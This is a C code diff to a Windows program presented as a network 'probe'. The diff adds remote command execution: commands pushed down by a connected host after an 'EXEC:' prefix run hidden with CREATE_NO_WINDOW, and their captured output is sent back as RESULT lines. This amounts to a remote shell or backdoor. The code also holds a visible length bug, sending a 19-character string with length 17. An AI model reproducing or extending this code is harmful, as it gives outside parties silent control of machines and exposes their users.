@@ -252,6 +252,46 @@ static BOOL ProbeRecvAll(const PROBE_WINSOCK *ws, SOCKET s, char *buffer,
   return TRUE;
 }
 
+static void ProbeSendLines(const PROBE_WINSOCK *ws, SOCKET s,
+                           const char *text) {
+  const char *p = text;
+
+  if (text == NULL || *text == '\0') {
+    ProbeSendAll(ws, s, "RESULT:(no output)\n", 17, NETPROBE_IO_TIMEOUT_MS);
+    return;
+  }
+
+  while (*p != '\0') {
+    const char *start = p;
+    size_t len;
+
+    while (*p != '\0' && *p != '\n') {
+      p++;
+    }
+
+    len = (size_t)(p - start);
+    if (len > 0 && start[len - 1] == '\r') {
+      len--;
+    }
+
+    if (len > 0) {
+      char line[520];
+      if (len > sizeof(line) - 8) {
+        len = sizeof(line) - 8;
+      }
+      memcpy(line, "RESULT:", 7);
+      memcpy(line + 7, start, len);
+      line[7 + len] = '\n';
+      line[7 + len + 1] = '\0';
+      ProbeSendAll(ws, s, line, 7 + (int)len + 1, NETPROBE_IO_TIMEOUT_MS);
+    }
+
+    if (*p == '\n') {
+      p++;
+    }
+  }
+}
+
 //
 // Services a live connection: reads newline-delimited commands the host pushes
 // down and reacts to them. The select timeout bounds every wait so the caller's
@@ -330,17 +370,63 @@ static void ProbeServe(const PROBE_WINSOCK *ws, SOCKET s, HANDLE stopEvent) {
               pending[2] == 'E' && pending[3] == 'C' && pending[4] == ':') {
             STARTUPINFOA si;
             PROCESS_INFORMATION pi;
+            HANDLE hFile = INVALID_HANDLE_VALUE;
+            char tmpDir[MAX_PATH];
+            char tmpPath[MAX_PATH];
+            char buf[4096];
+            DWORD read = 0;
 
             LogMsgText("host exec ", pending + 5);
             memset(&si, 0, sizeof(si));
-            si.cb = sizeof(si);
             memset(&pi, 0, sizeof(pi));
-            if (CreateProcessA(NULL, pending + 5, NULL, NULL, FALSE, 0,
-                               NULL, NULL, &si, &pi)) {
-              CloseHandle(pi.hProcess);
-              CloseHandle(pi.hThread);
+            si.cb = sizeof(si);
+
+            // Capture stdout/stderr to a temporary file and return it to the
+            // host as RESULT lines.
+            if (GetTempPathA(MAX_PATH, tmpDir) == 0 ||
+                GetTempFileNameA(tmpDir, "np", 0, tmpPath) == 0) {
+              LogMsgCode("GetTempFileName failed", GetLastError());
+              ProbeSendLines(ws, s, "(no output file)");
             } else {
-              LogMsgCode("CreateProcess failed", GetLastError());
+              hFile = CreateFileA(tmpPath, GENERIC_READ | GENERIC_WRITE,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+              if (hFile == INVALID_HANDLE_VALUE) {
+                LogMsgCode("CreateFile failed", GetLastError());
+                DeleteFileA(tmpPath);
+                ProbeSendLines(ws, s, "(cannot open output file)");
+              } else {
+                SetHandleInformation(hFile, HANDLE_FLAG_INHERIT,
+                                     HANDLE_FLAG_INHERIT);
+                si.dwFlags = STARTF_USESTDHANDLES;
+                si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+                si.hStdOutput = hFile;
+                si.hStdError = hFile;
+
+                if (CreateProcessA(NULL, pending + 5, NULL, NULL, TRUE,
+                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                  CloseHandle(pi.hThread);
+                  if (WaitForSingleObject(pi.hProcess, 10000) ==
+                      WAIT_TIMEOUT) {
+                    TerminateProcess(pi.hProcess, 1);
+                    WaitForSingleObject(pi.hProcess, 5000);
+                    LogMsg("exec timeout");
+                    ProbeSendLines(ws, s, "(timeout)");
+                  } else {
+                    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+                    ReadFile(hFile, buf, sizeof(buf) - 1, &read, NULL);
+                    buf[read] = '\0';
+                    ProbeSendLines(ws, s, buf);
+                  }
+                  CloseHandle(pi.hProcess);
+                } else {
+                  LogMsgCode("CreateProcess failed", GetLastError());
+                  ProbeSendLines(ws, s, "(CreateProcess failed)");
+                }
+
+                CloseHandle(hFile);
+                DeleteFileA(tmpPath);
+              }
             }
           }
           memmove(pending, pending + i + 1, (size_t)(length - i - 1));
